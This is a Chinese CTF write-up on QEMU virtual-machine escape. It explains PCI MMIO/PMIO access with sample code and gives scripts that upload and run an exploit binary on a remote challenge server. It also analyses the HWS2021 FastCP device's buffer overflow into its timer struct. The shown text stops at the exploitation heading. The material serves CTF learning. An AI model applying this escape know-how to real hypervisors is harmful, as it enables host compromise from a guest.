# QEMU逃逸初探（一）

阅读量 **225985**

|评论 **3**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2021-10-18 14:30:30

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t013033a04020acb088.jpg)

## 00 前言

在 HWS2021 入营选拔比赛的时候，遇到了一道 QEMU 逃逸的题目，那个时候就直接莽上去分析了一通，东拼西凑的把 EXP
写了出来。但实际上并没有怎么理解其具体是怎么实现的，有些操作这样做背后的原理是什么。而通常我对于比赛过程中学习到的内容，都会通过写详细的 Writeup
的这个过程来系统的学习。但是 QEMU 逃逸这部分的内容实在是比较复杂，而且涉及到了很多我完全没有了解过的知识，所以一直鸽到了现在。

里面的大多数内容和图片，都是我从看到的博客或者维基百科中整理收集的，具体链接可以看下文中的参考资料，非常感谢这些内容的制作者为我们初学者提供了学习的平台和资料。

## 01 基础知识

###  1.1 QEMU

简单的来说，QEMU 就是一个开源的模拟器和虚拟机，通过动态的二进制转换来模拟 CPU。

**1.1.1 QEMU 有多种运行的模式**

  * User mode：用户模式，在这种模式下，QEMU 运行某个单一的程序，并且适配其的系统调用。通常我们遇到的异构 PWN 题都会使用这种模式，这种模式可以简单轻便的模拟出其他架构程序的执行过程，使做题人的重心倾斜于分析异构的题目文件上，而不是转换过程中。
  * System mode：系统模式，在这种模式下，QEMU 可以模拟出一个完整的计算机系统。通常我们遇到的 QEMU 逃逸的题目都会使用这种模式，并且把漏洞点以有漏洞的设备的形式出现，通常漏洞会有数组越界、栈溢出、任意调用指针函数、函数重入等漏洞。
  * KVM Hosting
  * Xen Hosting

**1.1.2 QEMU 的内存结构**

qemu 使用 mmap 为虚拟机申请出相应大小的内存，当做虚拟机的物理内存，且这部分内存没有执行权限（PROT_EXEC）

**1.1.3 QEMU 的地址翻译**

在 QEMU 中存在两个转换层，分别是：

  * 从用户虚拟地址到用户物理地址：这一层转换是模拟真实设备中所需要的虚拟地址和物理地址而存在的，所以我们也可以通过分析转换规则，编写程序来模拟这一层转换。
  * 从用户物理地址到 QEMU 的虚拟地址空间：这一层是把用户的物理地址转换为 QEMU 上使用 mmap 申请出的地址空间，这部分空间的内容与用户的物理地址逐一对应，所以我们只需要知道 QEMU 上使用 mmap 申请出的地址空间的初始地址，再加上用户物理地址，就可以得到此地址对应的在 QEMU 中的虚拟地址。

在 x64 系统上，虚拟地址由 page offset (bits 0-11) 和 page number 组成，/proc/$pid/pagemap
这个文件中储存着此进程的页表，让用户空间进程可以找出每个虚拟页面映射到哪个物理帧（需要 CAP_SYS_ADMIN 权限），它包含一个 64
位的值，包含以下的数据。

  * Bits 0-54 page frame number (PFN) if present
  * Bits 0-4 swap type if swapped
  * Bits 5-54 swap offset if swapped
  * Bit 55 pte is soft-dirty (see Documentation/vm/soft-dirty.txt)
  * Bit 56 page exclusively mapped (since 4.2)
  * Bits 57-60 zero
  * Bit 61 page is file-page or shared-anon (since 3.5)
  * Bit 62 page swapped
  * Bit 63 page present

以下程序通过读取这个文件实现了一个转换过程

    
    
    #include <stdio.h>
    #include <string.h>
    #include <stdint.h>
    #include <stdlib.h>
    #include <fcntl.h>
    #include <assert.h>
    #include <inttypes.h>
    
    #define PAGE_SHIFT  12
    #define PAGE_SIZE   (1 << PAGE_SHIFT)
    #define PFN_PRESENT (1ull << 63)
    #define PFN_PFN     ((1ull << 55) - 1)
    
    int fd;
    
    uint32_t page_offset(uint32_t addr)
    {
        return addr & ((1 << PAGE_SHIFT) - 1);
    }
    
    uint64_t gva_to_gfn(void *addr)
    {
        uint64_t pme, gfn;
        size_t offset;
        offset = ((uintptr_t)addr >> 9) & ~7;
        lseek(fd, offset, SEEK_SET);
        read(fd, &pme, 8);
        if (!(pme & PFN_PRESENT))
            return -1;
        gfn = pme & PFN_PFN;
        return gfn;
    }
    
    uint64_t gva_to_gpa(void *addr)
    {
        uint64_t gfn = gva_to_gfn(addr);
        assert(gfn != -1);
        return (gfn << PAGE_SHIFT) | page_offset((uint64_t)addr);
    }
    
    int main()
    {
        uint8_t *ptr;
        uint64_t ptr_mem;
    
        fd = open("/proc/self/pagemap", O_RDONLY);
        if (fd < 0) {
            perror("open");
            exit(1);
        }
    
        ptr = malloc(256);
        strcpy(ptr, "Where am I?");
        printf("%s\n", ptr);
        ptr_mem = gva_to_gpa(ptr);
        printf("Your physical address is at 0x%"PRIx64"\n", ptr_mem);
    
        getchar();
        return 0;
    }
    

值得注意的是，在虚拟空间中连续的一段空间，在物理空间中并不一定连续，实际上，这部分的虚拟地址空间会以页为单位被分隔成多个物理内存碎片。在某些情况下，QEMU
中的虚拟设备对物理内存的复制可能超过一页（0x1000 字节），这时候复制出物理内存中超过这一页的内容就与虚拟内存中超过这一页的内容无法对应。

###  1.2 PCI 设备地址空间

**1.2.1 PCI 配置空间**

PCI 设备都有一个 PCI 配置空间来配置 PCI 设备，其中包含了关于 PCI 设备的特定信息。

![](https://p0.ssl.qhimg.com/t01513f47ad2ba880c0.png)

其中 BAR（BASE Address Registers）用来确定设备所需要使用的内存和 I/O 空间的大小，也可以用来存放设备寄存器的地址。

设备可以申请两类的地址空间，Memory Space 和 I/O Space，以下会进行介绍。

**1.2.2 Memory Space 类型（MMIO）**

内存和 I/O 设备共享同一个地址空间。 MMIO 是应用得最为广泛的一种 I/O 方法，它使用相同的地址总线来处理内存和 I/O 设备，I/O
设备的内存和寄存器被映射到与之相关联的地址。当 CPU 访问某个内存地址时，它可能是物理内存，也可以是某个 I/O 设备的内存，用于访问内存的 CPU
指令也可来访问 I/O 设备。每个 I/O 设备监视 CPU 的地址总线，一旦 CPU
访问分配给它的地址，它就做出响应，将数据总线连接到需要访问的设备硬件寄存器。为了容纳 I/O 设备，CPU 必须预留给 I/O
一个地址区域，该地址区域不能给物理内存使用。

![](https://p1.ssl.qhimg.com/t01a97028b7de9d6955.png)

  * Bit 0：Region Type，总是为 0，用于区分此类型为 Memory
  * Bits 2-1：Locatable，为 0 时表示采用 32 位地址，为 2 时表示采用 64 位地址，为 1 时表示区间大小小于 1MB
  * Bit 3：Prefetchable，为 0 时表示关闭预取，为 1 时表示开启预取
  * Bits 31-4：Base Address，以 16 字节对齐基址

![](https://p1.ssl.qhimg.com/t014a4e49a0207d55ec.png)

**1.2.3 I/O Space 类型（PMIO）**

在 PMIO 中，内存和 I/O 设备有各自的地址空间。 端口映射 I/O 通常使用一种特殊的 CPU 指令，专门执行 I/O 操作。在 Intel
的微处理器中，使用的指令是 IN 和 OUT。这些指令可以读/写 1,2,4 个字节（例如：outb, outw, outl）到 IO 设备上。I/O
设备有一个与内存不同的地址空间，为了实现地址空间的隔离，要么在 CPU 物理接口上增加一个 I/O 引脚，要么增加一条专用的 I/O 总线。由于 I/O
地址空间与内存地址空间是隔离的，所以有时将 PMIO 称为被隔离的 IO(Isolated I/O)。

![](https://p5.ssl.qhimg.com/t01fc4ef8c260ac4957.png)

  * Bit 0：Region Type，总是为 1，用于区分此类型为 I/O
  * Bit 1：Reserved
  * Bits 31-2：Base Address，以 4 字节对齐基址

![](https://p3.ssl.qhimg.com/t01705f97e43a0cc0b5.png)

**1.2.4 PCI 设备配置的地址**

设备地址的格式可以参考下图，这个地址的用处在下文 **QEMU 中如何初始化 PCI 设备** 处会做出解释

![](https://p0.ssl.qhimg.com/t019e25b499378d7ceb.png)

我们可以通过以下代码进行计算

    
    
    0x80000000 | bus << 16 | device << 11 | function <<  8 | offset
    

###  1.3 QEMU 中 的 PCI 设备

**1.3.1 QEMU 中如何初始化 PCI 设备**

初始化过程非常复杂，这里只简单的阐述，以下几个是初始化过程中的重要函数，但是想要深入的了解这个过程，仍然需要尝试着对这个过程进行下断调试。

**do_pci_register_device**

对设备实例对象进行设置。

  * 做一些基础的检查，是否存在冲突等，如果检查不通过则报错返回
  * 调用 pci_config_alloc(pci_dev) 来分配配置空间，PCI 设备为 256B，PCIe 为 4096B
  * 调用 pci_config_set_vendor_id / pci_config_set_device_id / pci_config_set_revision / pci_config_set_revision 来初始化设备配置
  * 设置 pci_dev->config_read 和 pci_dev->config_write ，如果在类构造函数中设置了则用设置的，否则使用默认函数 pci_default_read_config / pci_default_write_config

**pci_register_bar**

  * 将 BAR 中的 Base Address 设置为全 FF

**pci_do_device_reset**

  * 对设备进行清理和设置

**pci_default_read_config**

  * 读取 Config，从 cpu->kvm_run 中取出 io 信息

**pci_default_write_config**

  * 设置 Config，且设置的值通过以下变换

其中 wmask 取决于 size ，w1cmask 是保证对应位置为 1

    
    
    uint64_t wmask = ~(size - 1)
    pci_set_long(pci_dev->wmask + addr, wmask & 0xffffffff);
    for (i = 0; i < l; val >>= 8, ++i) {
        uint8_t wmask = d->wmask[addr + i];   
        uint8_t w1cmask = d->w1cmask[addr + i];
        assert(!(wmask & w1cmask));
        d->config[addr + i] = (d->config[addr + i] & ~wmask) | (val & wmask);
        d->config[addr + i] &= ~(val & w1cmask); /* W1C: Write 1 to Clear */
    }
    

**pci_update_mappings**

遍历设备的 BAR，如果发现 BAR 中已经填写了不同于 r->addr 的地址，则说明新的地址已经更新，则会更新并重新注册地址。

**1.3.2 配置的读取和写入**

一般在软件实现上使用两种方法：一种是通过 I/O 地址 PCI CONFIG_ADDRESS（0xCF8）和 PCI
CONFIG_DATA（0xCFC）的传统方法，另一种是为 PCIe 创建的内存映射方法。

**传统方法想要写入配置需要分为两步**

  1. 通过 CONFIG_ADDRESS（0xCF8 端口） 设置目标设备地址：将要操作的设备寄存器的地址写入 CONFIG_ADDRESS
  2. 通过 CONFIG_DATA（0xCFC 端口） 来写值：将应该写入的数据放入 CONFIG_DATA 寄存器

由于此过程需要写入寄存器才能写入设备的寄存器，因此称为“间接写入”。

**传统方法想要读取配置也需要分为两步**

  1. 通过 CONFIG_ADDRESS（0xCF8 端口） 设置目标设备地址：将要操作的设备寄存器的地址写入 CONFIG_ADDRESS
  2. 通过 CONFIG_DATA（0xCFC 端口） 来读值

同时我们结合上面说明过的对 I/O 地址的操作方法，在这里我们就可以使用 outb, outw, outl 来对上述端口写值；用 inb，inw，inl
来读值。

可以参考以下操作系统中读取 PCI 设备的配置空间方法

    
    
    uint16_t pciConfigReadWord (uint8_t bus, uint8_t slot, uint8_t func, uint8_t offset) {
        uint32_t address;
        uint32_t lbus  = (uint32_t)bus;
        uint32_t lslot = (uint32_t)slot;
        uint32_t lfunc = (uint32_t)func;
        uint16_t tmp = 0;
    
        /* create configuration address as per Figure 1 */
        address = (uint32_t)((lbus << 16) | (lslot << 11) |
                  (lfunc << 8) | (offset & 0xfc) | ((uint32_t)0x80000000));
    
        /* write out the address */
        outl(0xCF8, address);
        /* read in the data */
        /* (offset & 2) * 8) = 0 will choose the first word of the 32 bits register */
        tmp = (uint16_t)((inl(0xCFC) >> ((offset & 2) * 8)) & 0xffff);
        return (tmp);
    }
    

**1.3.3 qtest 中的 PCI 设备初始化**

如果 QEMU 是使用 qtest 启动，而不是通过整个系统镜像，那么这时的 PCI 设备初始的并不完全，我们需要手动调用 qtest
中的指令对设备配置读写，来往 BAR 上写 MMIO 的地址。其中使用的方法是通过 I/O 地址 PCI CONFIG_ADDRESS（0xCF8）和
PCI CONFIG_DATA（0xCFC）来间接写入。

所以初始化的步骤应该是（以 MMIO 为例）：

  1. 将 MMIO 地址写入设备的 BAR0 地址
  2. 将命令写入设备的 COMMAND 地址，触发 pci_update_mappings 来重新注册 BAR0 地址

其中 COMMAND 的命令定义如下：

通常的设置都是选择 0x103，也就是设置 SERR#Enable，Memory space 和 IO space。如果要正确使用 DMA，则还需要设置
Bit 2 Bus Master，也就是写入 0x107。

最终需要执行的命令可以参考如下

    
    
    outl 0xcf8 0x80001010
    outl 0xcfc 0xfebc0000
    outl 0xcf8 0x80001004
    outw 0xcfc 0x107
    

其中 0x80001000 为设备配置的地址，可以根据上文中 **PCI 设备配置的地址** 所给出的结构计算得到，0x10 偏移处为 BAR0，0x4
偏移处为 COMMAND。

假设 MMIO 地址选择的是 0xfebc0000，那么最终 BAR0 基址会被设置为 0xfeb00000，以该地址为基址进行读写就能够触发 MMIO
函数。

**1.3.4 QEMU 中查看 PCI 设备**

查看设备的方法可以分为两种，lspci 命令和 info pci。

**lspci 命令**

如果 QEMU 直接启动了一个系统，那么就可以优先考虑使用 lspci 命令列出系统中所有 PCI 总线和设备的详细信息。

    
    
    # lspci
    00:01.0 Class 0601: 8086:7000
    00:04.0 Class 00ff: dead:beef
    00:00.0 Class 0600: 8086:1237
    00:01.3 Class 0680: 8086:7113
    00:03.0 Class 0200: 8086:100e
    00:01.1 Class 0101: 8086:7010
    00:02.0 Class 0300: 1234:1111
    

命令开头的 xx:yy.z 格式对应的是 bus（总线）、device（设备）、function（功能），之后的内容是
Class、Vendor、Device。

有了 bus、device、function 这三个信息我们就能够通过 **/sys/devices/pci0000:00/0000:[tag]** 其中的
tag 格式就是 lspci 中第一列所看到的”bus:device:function”。

**info pci 命令**

这个命令依赖于 QEMU 中的 monitor

首先需要修改 launch.sh，添加 monitor 选项（-monitor telnet:127.0.0.1:4444,server,nowait）

添加后在 QEMU 启动时就会开启 4444 端口为 monitor，我们可以使用 nc 或者 telnet 连接 4444 端口对 QEMU
进行管理操作。

连接后输入 info pci 就可以查看到所有 PCI

    
    
    wjh@ubuntu:~$ nc 127.0.0.1 4444
    QEMU 6.0.93 monitor - type 'help' for more information
    (qemu) info pci
    info pci
      Bus  0, device   0, function 0:
        Host bridge: PCI device 8086:1237
          PCI subsystem 1af4:1100
          id ""
      Bus  0, device   1, function 0:
        ISA bridge: PCI device 8086:7000
          PCI subsystem 1af4:1100
          id ""
      Bus  0, device   1, function 1:
        IDE controller: PCI device 8086:7010
          PCI subsystem 1af4:1100
          BAR4: I/O at 0xffffffffffffffff [0x000e].
          id ""
      Bus  0, device   1, function 3:
        Bridge: PCI device 8086:7113
          PCI subsystem 1af4:1100
          IRQ 0, pin A
          id ""
      Bus  0, device   2, function 0:
        Class 0255: PCI device 2021:0815
          PCI subsystem 1af4:1100
          IRQ 0, pin A
          BAR0: 32 bit memory at 0xffffffffffffffff [0x000ffffe].
          id ""
    

如果觉得信息不够完善，还可以用 info qtree 来输出树形结构的完整信息。

    
    
    (qemu) info qtree
    info qtree
    bus: main-system-bus
      type System
      dev: hpet, id ""
        gpio-in "" 2
        gpio-out "" 1
        gpio-out "sysbus-irq" 32
        timers = 3 (0x3)
        msi = false
        hpet-intcap = 4 (0x4)
        hpet-offset-saved = true
        mmio 00000000fed00000/0000000000000400
      dev: ioapic, id ""
        gpio-in "" 24
        version = 32 (0x20)
        mmio 00000000fec00000/0000000000001000
      dev: i440FX-pcihost, id ""
        pci-hole64-size = 2147483648 (2 GiB)
        short_root_bus = 0 (0x0)
        x-pci-hole64-fix = true
        x-config-reg-migration-enabled = true
        bypass-iommu = false
        bus: pci.0
          type PCI
          dev: ctf, id ""
            addr = 02.0
            romfile = ""
            romsize = 4294967295 (0xffffffff)
            rombar = 1 (0x1)
            multifunction = false
            x-pcie-lnksta-dllla = true
            x-pcie-extcap-init = true
            failover_pair_id = ""
            acpi-index = 0 (0x0)
            class Class 00ff, addr 00:02.0, pci id 2021:0815 (sub 1af4:1100)
            bar 0: mem at 0xffffffffffffffff [0xffffe]
          ...
          dev: i440FX, id ""
            addr = 00.0
            romfile = ""
            romsize = 4294967295 (0xffffffff)
            rombar = 1 (0x1)
            multifunction = false
            x-pcie-lnksta-dllla = true
            x-pcie-extcap-init = true
            failover_pair_id = ""
            acpi-index = 0 (0x0)
            class Host bridge, addr 00:00.0, pci id 8086:1237 (sub 1af4:1100)
      dev: fw_cfg_io, id ""
        dma_enabled = true
        x-file-slots = 32 (0x20)
        acpi-mr-restore = true
      dev: kvmvapic, id ""
    

**1.3.5 QEMU 程序中的 PCI 设备定位**

如果我们想要查到某个 QEMU 程序中 PCI 设备所对应的路径，那么可以通过对照 Class、Vendor、Device 的信息来确定。

例如下图中我搜索到 QEMU 中的 FastCP 设备

![](https://p2.ssl.qhimg.com/t015db9da3f6fc49f9d.png)

找到此设备的初始化函数（FastCP_class_init），并且设置对应变量的类型为 **PCIDeviceClass ***

![](https://p5.ssl.qhimg.com/t0150fa65e1ba1bc6d5.png)

根据其中的 class_id 赋值就可以得知，对应的 Class 应该是 00ff，根据对 vendor_id 赋值可知，对应的 Vendor ID 是
dead 、 Device ID 是 beef（这里由于程序的优化，把结构中两个连续的二字节的变量优化成一次赋值）

对照着 lspci 的结果，我们就可以得知 FastCP 对应的 PCI 设备条目是

    
    
    00:04.0 Class 00ff: dead:beef
    

得知其条目后我们可以访问该目录（/sys/devices/pci0000:00/0000:00:04.0/）中对应的文件资源来得到我们需要的数据

  * **resource 文件** ：此文件包含其相应空间的数据，resource0 对应 MMIO 空间，resource1 对应 PMIO 空间，这个文件可以便于我们在用户空间编程访问，在 **1.3.6 QEMU 中访问 PCI 设备的 I/O 空间** 中还会提及。
  * **config 文件** ：此文件包含着该设备的配置文件信息，结合之前的配置空间格式可以快速的看到开头的 dead 和 beef 分别对应着 vendor 和 device，这和之前用 lspci 看到的内容一致。 
    
        # hexdump  /sys/devices/pci0000\:00/0000\:00\:04.0/config
    0000000 dead beef 0103 0010 0001 00ff 0000 0000
    0000010 0000 fea0 0000 0000 0000 0000 0000 0000
    0000020 0000 0000 0000 0000 0000 0000 1af4 1100
    0000030 0000 0000 0040 0000 0000 0000 010b 0000
    0000040 0005 0080 0000 0000 0000 0000 0000 0000
    0000050 0000 0000 0000 0000 0000 0000 0000 0000
    

**1.3.6 QEMU 中访问 PCI 设备的 MMIO 空间**

**在用户态访问 mmio 空间**

通过映射 resource0 文件来实现，函数中的参数类型选择 uint32_t 还是 uint64_t 可以根据设备代码中限制的要求来确定，示例代码如下：

    
    
    #include <assert.h>
    #include <fcntl.h>
    #include <inttypes.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <sys/mman.h>
    #include <sys/types.h>
    #include <unistd.h>
    #include<sys/io.h>
    
    
    unsigned char* mmio_mem;
    
    void die(const char* msg)
    {
        perror(msg);
        exit(-1);
    }
    
    
    
    void mmio_write(uint32_t addr, uint32_t value)
    {
        *((uint32_t*)(mmio_mem + addr)) = value;
    }
    
    uint32_t mmio_read(uint32_t addr)
    {
        return *((uint32_t*)(mmio_mem + addr));
    }
    
    
    
    
    int main(int argc, char *argv[])
    {
    
        // Open and map I/O memory for the strng device
        int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
        if (mmio_fd == -1)
            die("mmio_fd open failed");
    
        mmio_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);
        if (mmio_mem == MAP_FAILED)
            die("mmap mmio_mem failed");
    
        printf("mmio_mem @ %p\n", mmio_mem);
    
        mmio_read(0x128);
        mmio_write(0x128, 1337);
    
    }
    

**在内核态中访问 mmio 空间**

示例代码如下：

    
    
    #include <asm/io.h>
    #include <linux/ioport.h>
    
    long addr=ioremap(ioaddr,iomemsize);
    readb(addr);
    readw(addr);
    readl(addr);
    readq(addr);//qwords=8 btyes
    
    writeb(val,addr);
    writew(val,addr);
    writel(val,addr);
    writeq(val,addr);
    iounmap(addr);
    

**1.3.7 QEMU 中访问 PCI 设备的 PMIO 空间**

根据上文所说，直接通过 in 和 out 指令就可以访问 I/O memory（outb/inb, outw/inw, outl/inl）

但是使用这些函数的前提是要让程序有访问端口的权限：

  * 在 0x000-0x3ff 之间的端口，可以使用 ioperm(from, num, turn_on)
  * 对于 0x3ff 以上的端口，可以使用 iopl(3)，使程序可以访问所有端口

示例代码：

    
    
    #include <sys/io.h>
    uint32_t pmio_base = 0xc050;
    
    uint32_t pmio_write(uint32_t addr, uint32_t value)
    {
        outl(value,addr);
    }
    
    uint32_t pmio_read(uint32_t addr)
    {
        return (uint32_t)inl(addr);
    }
    
    int main(int argc, char *argv[])
    {
    
        // Open and map I/O memory for the strng device
        if (iopl(3) !=0 )
            die("I/O permission is not enough");
            pmio_write(pmio_base+0,0);
        pmio_write(pmio_base+4,1);
    
    }
    

代码中的 pmio_base 的位置可以通过查看设备的 BAR 内容来确定

在内核态访问 PMIO 操作是和用户态类似的，区别在于内核态不用申请权限、头文件需要使用以下两个。

    
    
    #include <asm/io.h> 
    #include <linux/ioport.h>
    

###  1.4 调试

**调试**

使用 gdb 附加调试运行中的 QEMU 并加载二进制文件中的符号，执行如下代码：

    
    
    sudo gdb ./qemu-system-x86_64
    attach 相应的进程号
    

进程号使用 ps -aux 可以看到

###  1.5 执行 EXP

执行 EXP 需要区分为两种情况，分别是本地执行和远程执行。

**1.5.1 本地执行**

这里推荐使用重新打包的方法，这种方法可以无视系统的具体环境限制

为了方便打包，我这里写了一个脚本

**uncpio**

    
    
    #!/bin/bash
    set -e
    cp $1 /tmp/core.gz
    unar /tmp/core.gz -o /tmp/
    

使用方式：uncpio xxx.cpio

脚本会执行：解压参数 1 中指定的 cpio 文件到 /tmp/core 目录

**encpio**

    
    
    #!/bin/sh
    set -e
    musl-gcc  -static -O2 $1 -o /tmp/core/bin/EXP
    cd /tmp/core/
    find . -print0 | cpio --null -ov --format=newc > /tmp/new.cpio
    cd -    cp /tmp/new.cpio ./new.cpio
    

使用方式：encpio exp.c

脚本会执行：把参数 1 中指定的 exp.c 使用 musl-gcc 编译，然后放入 uncpio 解包出的文件（在/tmp/core
）中，对其重新打包后，再把文件复制到执行目录下的 new.cpio 文件中。

修改 launch.sh 文件把加载文件替换为 new.cpio ，进入系统后执行 /bin/EXP 即可执行 EXP 代码。

**1.5.2 远程执行**

远程执行需要考虑的就是如何上传 EXP，这里提供两种方式，适用于不同的环境（如果是普通用户权限，修改代码中的 cmd 为 “$ “）

**上传脚本 1（一次性发送全部数据）**

    
    
    #!/usr/bin/env python
    # -*- coding: utf-8 -*-    from pwn import *
    import os
    
    # context.log_level = 'debug'
    cmd = '# '
    
    
    def exploit(r):
        r.sendlineafter(cmd, 'stty -echo')
        os.system('musl-gcc  -static -O2 ./poc/exp.c -o ./poc/exp')
        os.system('gzip -c ./poc/exp > ./poc/exp.gz')
        r.sendlineafter(cmd, 'cat <<EOF > exp.gz.b64')
        r.sendline((read('./poc/exp.gz')).encode('base64'))
        r.sendline('EOF')
        r.sendlineafter(cmd, 'base64 -d exp.gz.b64 > exp.gz')
        r.sendlineafter(cmd, 'gunzip ./exp.gz')
        r.sendlineafter(cmd, 'chmod +x ./exp')
        r.sendlineafter(cmd, './exp')
        r.interactive()
    
    
    # p = process('./startvm.sh', shell=True)
    p = remote('nc.eonew.cn',10100)
    
    exploit(p)
    

**上传脚本 2（分段传输）**

    
    
    #coding:utf8
    from pwn import *
    import base64
    context.log_level = 'debug'
    os.system("musl-gcc 1.c -o exp --static")
    sh = remote('127.0.0.1',5555)
    
    f = open('./exp','rb')
    content = f.read()
    total = len(content)
    f.close()
    per_length = 0x200;
    sh.sendlineafter('# ','touch /tmp/exploit')
    for i in range(0,total,per_length):
       bstr = base64.b64encode(content[i:i+per_length])
       sh.sendlineafter('# ','echo {} | base64 -d >> /tmp/exploit'.format(bstr))
    if total - i > 0:
       bstr = base64.b64encode(content[total-i:total])
       sh.sendlineafter('# ','echo {} | base64 -d >> /tmp/exploit'.format(bstr))
    
    sh.sendlineafter('# ','chmod +x /tmp/exploit')
    sh.sendlineafter('# ','/tmp/exploit')
    sh.interactive()
    

## 02 QEMU 逃逸题目实战

这里以我第一个在比赛中做出的 QEMU 逃逸题：”HWS2021 FastCP” 为例。

###  2.1 定位设备

我们首先查看启动命令

    
    
    #!/bin/sh
    ./qemu-system-x86_64 -initrd ./initramfs-busybox-x64.cpio.gz -nographic -kernel ./vmlinuz-5.0.5-generic -append "priority=low console=ttyS0" -monitor /dev/null --device FastCP
    

在启动命令的提示下，很容易就能在 qemu-system-x86_64 里面找到 FastCP 设备的具体实现，我们使用 IDA Pro
载入文件，等待加载完毕后，在右侧函数列表搜索 FastCP。

![](https://p3.ssl.qhimg.com/t01880d685dcd218c7a.png)

根据上文所说的，我们首先需要定位到 FastCP_class_init 来确定 vendor_id 和 device_id，并且通过这两个值来确定
lspci 的结果。

这里我们修改 v3 设备的类型为 PCIDeviceClass，再根据赋值来确定设备

![](https://p4.ssl.qhimg.com/t0188fff69daf36249d.png)

执行 launch.sh，启动 QEMU 程序，启动后登陆 root 账号，并执行 lspci

    
    
    # lspci
    00:01.0 Class 0601: 8086:7000
    00:04.0 Class 00ff: dead:beef
    00:00.0 Class 0600: 8086:1237
    00:01.3 Class 0680: 8086:7113
    00:03.0 Class 0200: 8086:100e
    00:01.1 Class 0101: 8086:7010
    00:02.0 Class 0300: 1234:1111
    

确定内容为 00:04.0 这一行设备，尝试访问其对应的资源

    
    
    # ls /sys/devices/pci0000\:00/0000\:00\:04.0/
    ari_enabled               firmware_node             resource
    broken_parity_status      irq                       resource0
    class                     local_cpulist             revision
    config                    local_cpus                subsystem
    consistent_dma_mask_bits  modalias                  subsystem_device
    d3cold_allowed            msi_bus                   subsystem_vendor
    device                    numa_node                 uevent
    dma_mask_bits             power                     vendor
    driver_override           remove
    enable                    rescan
    

我们可以看到其存在 resource0，这意味设备存在 mmio 空间，并且不存在 resource1，这意味着设备不存在 pmio
空间。这一点与我们之前在 IDA 中搜索得到的函数列表是吻合的。

###  2.2 QEMU 设备逆向

**2.2.1 初始化函数**

确定了设备位置后，我们接下来就是看设备对象初始化函数 **FastCP_instance_init**
，为了方便观看，首先我们要还原变量类型。而变量类型实际上是储存在符号中的，我们可以通过 Shift + F1 打开 Local Types 窗口查看。

![](https://p3.ssl.qhimg.com/t01c0c498b78bfa3c6f.png)

通过搜索可以定位到相关的三个类型信息，可以知道类型信息是存在的，只是 IDA 的伪代码没能够自动还原，我们可以通过按下 Tab
定位到汇编代码中给出的类型来还原。

![](https://p1.ssl.qhimg.com/t018aba138cf1f944cf.png)

根据图中的类型提示，分别设置参数类型为 Object_0 ，变量类型为 FastCPState ，得到的伪代码如下：

![](https://p5.ssl.qhimg.com/t01c118e03d87f9d281.png)

就可以很清楚的看到这个函数做了各种各样的初始化操作，之后的函数也用这种方法来还原类型信息，之后就不再赘述。

**2.2.2 MMIO READ**

知道初始化的内容后，我们就要在 mmio 操作中寻找对应的漏洞，我们首先来看 fastcp_mmio_read 函数。

![](https://p5.ssl.qhimg.com/t015a75d2b229998cba.png)

这个函数用于返回几个操作值，操作值具体的意义可以根据名称大概猜出。同时需要特别注意的是这里限制的 size 的大小，size 的大小不为 8 则会直接返回
-1，这意味着我们在调用 mmio_read 操作的时候需要使用的类型是 uint64_t。

操作列表如下

地址 | 操作  
---|---  
0x8 | 读取 cp_state.CP_list_src  
0x10 | 读取 cp_state.CP_list_cnt  
0x18 | 读取 cp_state.cmd  
  
这个函数内容较少，逻辑清晰可见，暂时未能看出漏洞。

**2.2.3 MMIO WRITE**

![](https://p0.ssl.qhimg.com/t018b9f4ff984b3d404.png)

在 QEMU 逃逸的题目中，主要的漏洞位置都是在 MMIO WRITE 中，所以我们需要特别关注。

操作列表如下

地址 | 操作  
---|---  
0x8 | 设置 cp_state.CP_list_src  
0x10 | 设置 cp_state.CP_list_cnt  
0x18 | 设置 cp_state.cmd 并触发 Timer  
  
通过操作可以了解到，关键的函数还是在时钟函数中，而且通过 cp_state.cmd 来传参

**2.2.4 CP TIMER**

此函数通过 Timer 来调用，并且通过 MMIO WRITE 设置

![](https://p5.ssl.qhimg.com/t01fe443231cc943e72.png)

操作列表如下

命令 | 操作  
---|---  
1 | 当 CP_list_cnt 大于 0x10 的时候：<br />依次遍历 CP_list_src，每个结构的 CP_cnt 作为长度，把
CP_src 先复制到 CP_buffer，再从 CP_buffer 复制到 CP_dst（相当于从 CP_src 到 CP_dst）。<br />当
CP_list_cnt 不大于 0x10 的时候：<br />做无意义的操作  
2 | CP_cnt 作为长度（最大 0x1000 字节），从 CP_src 读取内容写到 CP_buffer 中  
4 | CP_cnt 作为长度（最大 0x1000 字节），从 CP_buffer 写出到 CP_dst 中  
  
以上操作在操作前会设置 handling 为 1，操作结束后设置 handling = 0 和 cmd = 0。

漏洞还是比较明显的，在命令为 1 且 CP_list_cnt 大于 0x10 的时候，复制前没有检测 CP_cnt 是否会大于 0x1000 字节，而在
FastCPState 的结构中（结构如下）

    
    
    00000000 FastCPState     struc ; (sizeof=0x1A30, align=0x10, copyof_4530)
    00000000                                         ; XREF: pci_FastCP_uninit+23/o
    00000000                                         ; pci_FastCP_realize+59/o ...
    00000000 pdev            PCIDevice_0 ?           ; XREF: pci_FastCP_realize+9A/r
    000008F0 mmio            MemoryRegion_0 ?        ; XREF: pci_FastCP_realize+77/r
    000008F0                                         ; pci_FastCP_realize+9D/o ...
    000009E0 cp_state        CP_state ?              ; XREF: FastCP_instance_init+57/r
    000009E0                                         ; FastCP_instance_init+62/r ...
    000009F8 handling        db ?                    ; XREF: FastCP_instance_init+78/w
    000009F8                                         ; fastcp_mmio_read+55/r ...
    000009F9                 db ? ; undefined
    000009FA                 db ? ; undefined
    000009FB                 db ? ; undefined
    000009FC irq_status      dd ?                    ; XREF: pci_FastCP_realize+B4/w
    00000A00 CP_buffer       db 4096 dup(?)          ; XREF: FastCP_instance_init+23/r
    00000A00                                         ; FastCP_instance_init+2A/r ...
    00001A00 cp_timer        QEMUTimer_0 ?           ; XREF: pci_FastCP_uninit+23/o
    00001A00                                         ; pci_FastCP_realize+59/o ...
    00001A30 FastCPState     ends
    

CP_buffer 最大只有 0x1000 字节，在复制的中间过程中，如果设置 CP_cnt 为一个大于 0x1000 的值，就可以溢出到
cp_timer。同时如果我们利用这个功能，也可以读取到 cp_timer 上的内容。

###  2.3 利用

